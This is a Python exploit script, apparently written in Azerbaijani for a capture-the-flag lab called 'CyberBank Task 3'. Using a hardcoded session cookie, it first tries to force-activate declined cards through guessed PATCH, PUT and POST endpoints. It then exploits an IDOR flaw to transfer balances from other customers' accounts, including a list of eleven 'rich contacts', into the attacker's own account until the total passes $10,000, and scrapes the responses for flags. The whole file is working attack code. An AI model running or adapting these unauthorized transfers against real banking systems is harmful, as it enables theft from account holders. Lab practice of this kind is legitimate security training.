#!/usr/bin/env python3
"""
CyberBank Task 3 — Kart aktivləşdirmə + Transfer exploit
Problem: Bütün kartlar "declined" — transfer "Failed To Send" qaytarır
Həll: Kartı aktiv et, sonra transfer at
"""

import requests
import json
import time

BASE_URL = "http://web0x06.hbtn"
SESSION  = "_nnmEiQsDtGJYPp8TJep4CWTdn95Wu7MdQQ5eqOLeSs.C66-9eglFbLxeOTUrwi5NrrKvQs"

HEADERS = {
    "User-Agent"  : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept"      : "*/*",
    "Origin"      : BASE_URL,
    "Referer"     : f"{BASE_URL}/dashboard",
}
COOKIES = {"session": SESSION}

# Öz accountlarımız
ACC1_ID      = "3fa57d88d8a04f4fb7d0edd1b63ad2d0"
ACC1_NUMBER  = "108351626317"
ACC1_ROUTING = "106190002"

ACC2_ID      = "cd51837f6aa943b590e96b36d750cf97"
ACC2_NUMBER  = "104249820387"
ACC2_ROUTING = "106190008"

# Kartlarımız
CARDS = {
    "card1": "36317b6da8584ffea26a0b7fee4d5bdc",  # ACC1-in kartı
    "card2": "b0e0463b0100458b9cc2d13ef689fea7",  # ACC2-in kartı
    "card3": "b21cab0b9e2448dd907774797da5cc30",  # ACC2-in kartı
}

# Kontaktlar (IDOR transfer üçün)
LINDA_ACC1_ID      = "91753a1cfeeb4061a3ee9278cb1b4591"
LINDA_ACC1_NUMBER  = "108116058091"
LINDA_ACC1_ROUTING = "106190007"

ROBERT_ACC1_ID      = "f2458ca53540455f80189fea06e488fa"
ROBERT_ACC1_NUMBER  = "106838584631"
ROBERT_ACC1_ROUTING = "106190006"


def get(path):
    r = requests.get(f"{BASE_URL}{path}", headers=HEADERS,
                     cookies=COOKIES, timeout=8)
    return r

def post(path, payload):
    r = requests.post(f"{BASE_URL}{path}", json=payload,
                      headers=HEADERS, cookies=COOKIES, timeout=8)
    return r

def get_balance():
    r = get("/api/customer/info/me")
    if r.status_code == 200:
        d = r.json().get("message", {})
        return d.get("total_balance", 0)
    return 0

def extract_flags(obj, path=""):
    results = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            fp = f"{path}.{k}"
            if "flag" in str(k).lower():
                results.append((fp, str(v)))
            results.extend(extract_flags(v, fp))
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            results.extend(extract_flags(item, f"{path}[{i}]"))
    elif isinstance(obj, str):
        if any(x in obj.lower() for x in ["hbtn{","htb{","flag{","ctf{"]):
            results.append((path, obj))
    return results

def show(label, r):
    flags = []
    try:
        data  = r.json()
        flags = extract_flags(data)
        out   = json.dumps(data)[:120]
    except:
        out = r.text[:120]
    print(f"    [{r.status_code}] {label}: {out}")
    if flags:
        print(f"\n{'!'*55}")
        print(f"  !!! FLAG: {flags}")
        print(f"{'!'*55}\n")
    return flags

def sep(c="─", n=60): print(c * n)


def main():
    sep("═")
    print("  CyberBank Task 3 — Kart aktivləşdirməsi + Transfer")
    sep("═")
    print(f"\n[*] Başlanğıc balans: ${get_balance()}\n")
    all_flags = []

    # ══ 1. Kartı aktivləşdirməyə cəhd ═══════════════════════════════════════
    print("[1] Kart state dəyişdirmə endpoint-lərini axtarırıq:\n")

    for card_name, card_id in CARDS.items():
        # PATCH /api/cards/<id>
        r = requests.patch(f"{BASE_URL}/api/cards/{card_id}",
                           json={"state": "valid"},
                           headers=HEADERS, cookies=COOKIES, timeout=8)
        all_flags += show(f"PATCH /api/cards/{card_id[:8]} state=valid", r)

        # PUT /api/cards/<id>
        r = requests.put(f"{BASE_URL}/api/cards/{card_id}",
                         json={"state": "valid"},
                         headers=HEADERS, cookies=COOKIES, timeout=8)
        all_flags += show(f"PUT /api/cards/{card_id[:8]} state=valid", r)

        # POST /api/cards/<id>/activate
        r = post(f"/api/cards/{card_id}/activate", {})
        all_flags += show(f"POST /api/cards/{card_id[:8]}/activate", r)

        # POST /api/cards/update
        r = post("/api/cards/update", {"card_id": card_id, "state": "valid"})
        all_flags += show(f"POST /api/cards/update state=valid", r)

    sep()

    # ══ 2. Birbaşa kiçik transfer cəhdi (kart olmadan) ══════════════════════
    # Bəlkə wire transfer kart tələb etmir — routing/number lazımdır
    print("\n[2] Wire transfer — routing ilə (Linda → özümüzə):\n")

    # Linda-nın ACC1 → bizim ACC1
    r = post(f"/api/accounts/transfer_to/{ACC1_ID}", {
        "amount"    : 100,
        "raison"    : "Rent",
        "account_id": LINDA_ACC1_ID,
        "routing"   : ACC1_ROUTING,
        "number"    : ACC1_NUMBER,
    })
    all_flags += show("Linda→Yosri $100", r)

    # Bizim ACC1 → bizim ACC2 (kiçik məbləğ)
    r = post(f"/api/accounts/transfer_to/{ACC2_ID}", {
        "amount"    : 10,
        "raison"    : "test",
        "account_id": ACC1_ID,
        "routing"   : ACC2_ROUTING,
        "number"    : ACC2_NUMBER,
    })
    all_flags += show("Yosri ACC1→ACC2 $10", r)

    sep()

    # ══ 3. Robert-dən özümüzə IDOR ══════════════════════════════════════════
    print("\n[3] IDOR: Robert ($1523) → Yosri:\n")
    r = post(f"/api/accounts/transfer_to/{ACC1_ID}", {
        "amount"    : 1500,
        "raison"    : "Donation",
        "account_id": ROBERT_ACC1_ID,
        "routing"   : ACC1_ROUTING,
        "number"    : ACC1_NUMBER,
    })
    all_flags += show("Robert→Yosri $1500", r)

    sep()

    # ══ 4. Bütün zəngin kontaktlardan özümüzə IDOR ══════════════════════════
    print("\n[4] Bütün kontaktlardan IDOR transfer:\n")

    rich_contacts = [
        # (acc_id, number, routing, name, balans)
        ("f2458ca53540455f80189fea06e488fa", "106838584631", "106190006", "Robert-1",   1523),
        ("ece982ed8b544d04b0eb52b52552da5e", "109020935646", "106190003", "Robert-2",   1508),
        ("6d8d1db0e1a9421e943d0a9e8b2b529a", "101431178319", "106190004", "Patricia-1", 1437),
        ("e1756674df084adca362943e26e8bf64", "107536511170", "106190009", "James-1",    1350),
        ("749a031d355b436aac29086797263689", "105364971988", "106190008", "James-2",    1451),
        ("5d5df7ae77a946d6a024b95832ba9e48", "102618700730", "106190007", "Brian-1",    1823),
        ("41f85a1645be408285be9926a40f458c", "106509193911", "106190006", "Brian-2",    1226),
        ("6b6f3447e53f4c108adf0435c641591b", "103178152514", "106190000", "Megan-1",   1505),
        ("f327f7771e9442b88bc2fd5ed3e57f30", "105872091467", "106190008", "Mark-1",    1022),
        ("58997f03e2a2489d97657cfbaa3032d9", "104553113986", "106190002", "David-1",   1518),
        ("07f794f135454ed8851f384dd9334b47", "102715677379", "106190000", "David-2",   1302),
    ]

    for src_id, src_num, src_routing, name, bal in rich_contacts:
        r = post(f"/api/accounts/transfer_to/{ACC1_ID}", {
            "amount"    : bal,
            "raison"    : "Donation",
            "account_id": src_id,
            "routing"   : ACC1_ROUTING,
            "number"    : ACC1_NUMBER,
        })
        flags = show(f"{name} (${bal}) → Yosri", r)
        all_flags += flags

        current = get_balance()
        print(f"    → Cari balans: ${current}")
        if current and current > 10000:
            print(f"\n  *** $10,000 KEÇİLDİ! bal=${current} ***")
            # Flag üçün /api/customer/info/me yoxla
            r2 = get("/api/customer/info/me")
            all_flags += extract_flags(r2.json())
            break
        time.sleep(0.2)

    # ══ 5. Yekun balans + flag ═══════════════════════════════════════════════
    print(f"\n[*] Yekun balans: ${get_balance()}")
    r = get("/api/customer/info/me")
    if r.status_code == 200:
        all_flags += extract_flags(r.json())

    sep("═")
    if all_flags:
        seen = set()
        for item in all_flags:
            val = item[1] if isinstance(item, tuple) else str(item)
            if val not in seen:
                seen.add(val)
                print(f"\n  >>> FLAG: {val}")
    else:
        print("\n  Flag tapılmadı. Tam output-u göndər.")
    sep("═")


if __name__ == "__main__":
    main()
